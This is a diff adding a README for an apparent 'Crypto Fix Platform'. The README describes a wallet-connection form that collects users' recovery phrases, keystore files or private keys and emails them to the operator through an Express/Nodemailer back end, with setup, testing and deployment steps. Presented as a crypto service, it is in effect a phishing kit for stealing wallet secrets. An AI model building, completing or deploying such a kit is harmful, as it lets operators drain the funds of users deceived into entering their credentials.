@@ -1,4 +1,101 @@
-# Welcome to your Lovable project
+# Crypto Fix Platform
+
+A platform showcasing crypto services with a wallet connection form that sends data to a backend server via email when users attempt to connect their wallets.
+
+## Project Structure
+
+This project consists of two main parts:
+1. **Frontend**: React/TypeScript web application with a wallet connection form
+2. **Backend**: Express.js server that processes form submissions and sends emails using Nodemailer
+
+## Features
+
+- Modern UI design with dark theme
+- Interactive wallet connection modal
+- Different access methods for wallet connections (Phrase, Keystore JSON, Private Key)
+- Backend email service that sends form data to a specified email address
+- Toast notifications for form validation and submission status
+
+## Getting Started
+
+### Prerequisites
+
+- Node.js (v14 or later)
+- npm or yarn
+
+### Frontend Setup
+
+1. Install dependencies:
+```sh
+npm install
+```
+
+2. Start the development server:
+```sh
+npm run dev
+```
+
+The frontend application will be available at http://localhost:8080
+
+### Backend Setup
+
+1. Navigate to the server directory and install dependencies:
+```sh
+cd server
+npm install
+```
+
+2. Create a `.env` file in the server directory with your email configuration:
+```
+EMAIL_USER=your-gmail@gmail.com
+EMAIL_PASS=your-app-password
+PORT=3001
+```
+
+**Note**: For Gmail, you need to use an App Password. To generate one:
+- Enable 2-Step Verification on your Google Account
+- Go to Google Account > Security > App passwords
+- Generate a new app password and use it in the `.env` file
+
+3. Start the backend server:
+```sh
+npm run dev
+```
+
+The backend server will be available at http://localhost:3001
+
+### Testing the API
+
+You can test the wallet connection API using the included test page:
+
+1. Make sure the backend server is running
+2. Open http://localhost:3001/test.html in your browser
+3. Fill out the form and click "Test Connection"
+
+### Running Both Frontend and Backend
+
+For convenience, you can also run both the frontend and backend servers simultaneously:
+
+```sh
+npm run dev:all
+```
+
+### Testing Email Configuration
+
+To verify that your email settings are working correctly:
+
+```sh
+cd server
+npm run test-email
+```
+
+## API Documentation
+
+For detailed API documentation, see [API_DOCUMENTATION.md](./server/API_DOCUMENTATION.md) in the server directory.
+
+## Deployment
+
+For detailed instructions on deploying this application to production environments, see [DEPLOYMENT.md](./DEPLOYMENT.md).
 
 ## Project info
 
